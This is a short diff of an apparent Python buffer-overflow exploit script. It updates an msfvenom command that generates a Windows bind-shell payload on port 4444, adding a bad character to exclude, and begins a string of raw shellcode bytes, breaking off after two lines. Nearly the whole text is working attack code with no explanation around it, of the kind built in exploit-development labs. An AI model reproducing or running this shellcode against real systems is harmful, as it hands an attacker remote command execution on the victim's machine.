@@ -1,7 +1,7 @@
 import socket,sys
 # Create an array of buffers, from 1 to 5900, with increments of 200.
 
-#msfvenom -p windows/shell_bind_tcp RPORT=4444 -b "\x00\x0a" -f python
+#msfvenom -p windows/shell_bind_tcp RPORT=4444 -b "\x00\x0a\x0d" -f python
 buf =  ""
 buf += "\xba\x27\x98\x9b\x9e\xda\xd1\xd9\x74\x24\xf4\x58\x31"
 buf += "\xc9\xb1\x53\x31\x50\x12\x03\x50\x12\x83\xe7\x9c\x79"
